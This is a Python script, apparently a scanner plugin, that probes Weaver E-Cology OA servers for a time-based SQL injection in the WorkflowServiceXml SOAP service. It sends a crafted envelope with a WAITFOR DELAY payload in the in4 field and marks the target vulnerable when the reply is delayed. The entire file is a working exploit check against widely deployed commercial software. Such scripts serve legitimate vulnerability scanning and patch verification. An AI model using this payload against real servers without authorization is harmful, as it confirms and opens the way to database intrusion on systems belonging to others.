import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Content-Type': 'text/xml',
        'Accept-Encoding': 'gzip',
        'Content-Length': '487'
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
      <soapenv:Body>
          <web:getHendledWorkflowRequestList>
            <web:in0>1</web:in0>
            <web:in1>1</web:in1>
            <web:in2>1</web:in2>
            <web:in3>1</web:in3>
            <web:in4>
                <web:string>1=1 AND 2=2；WAITFOR DELAY '0:0:5'</web:string>
            </web:in4>
          </web:getHendledWorkflowRequestList>
      </soapenv:Body>
    </soapenv:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/services/WorkflowServiceXml")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult